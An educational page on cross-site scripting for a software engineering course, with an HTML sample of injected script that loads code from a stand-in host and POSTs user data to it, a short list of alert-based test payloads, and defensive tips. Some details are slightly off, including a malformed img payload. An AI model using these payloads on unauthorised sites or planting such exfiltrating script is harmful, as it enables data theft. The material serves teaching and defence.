# Cross Site Scripting (XSS)

Cross-site scripting (XSS) attacks are a type of injection in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser-side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

## Software Engineering Course Specifications

_"Cross-site scripting (XSS) involves injecting malicious code into an otherwise safe website. It is usually done through user input that is not sufficiently sanitised before being processed and stored on the server._  
_Students should be able to interpret fragments of JavaScript related to cross-site scripting."_

Either an internal threat actor has intentionally or unintentionally inserted the malicious code into the code base or an SQL/XXS vulnerability has been exploited to insert the malicious code into the code base. Students should be able to identify that an unknown script has been executed or that a POST request has been made to an unknown URL.

```html
    <HTML>
        <HEAD>
            <TITLE>Welcome to yourWebsite</TITLE>
            <link href="http://yourwebsite.com/favicon.png" />
        </HEAD>
        <BODY>
            <H1>Your Website</H1>
        <SCRIPT src="http://www.randomUrl.com/danger.js"></SCRIPT>

        or

        <SCRIPT>
            const response = fetch("http://www.randomUrl.com", {
                method: 'POST', 
                headers: {
                'Content-Type': 'application/json; charset=UTF-8',
                },
            body: JSON.stringify(yourData),
            });
        </SCRIPT>
        </BODY>
    </HTML>
```

## Non-destructive XSS Test Scripts

To use these scripts, paste them into any input boxes or after the URL in the browser address bar and see what gets executed or saved to the HTML.

1. `<script>alert(1)</script>`
2. `<img src=x onload(alert(1))>`
3. `<svg onload=alert(1)>`
4. `<iframe src=”javascript:alert(1)”></iframe>`

## How to secure against this attack

1. Regular code reviews
2. Only known and secure third-party libraries should be externally linked. Preferably, third-party libraries should be locally served after a code review.
3. Monitor 3rd party libraries for known vulnerabilities and on discovery.
4. Defensive data handling.
5. Declare the language `<html lang="en">`.
6. Delare charset `<meta charset="utf-8">`.
7. Content Security Policy (CSP) Blocking `<SVG>` and `<SCRIPT>` tags.
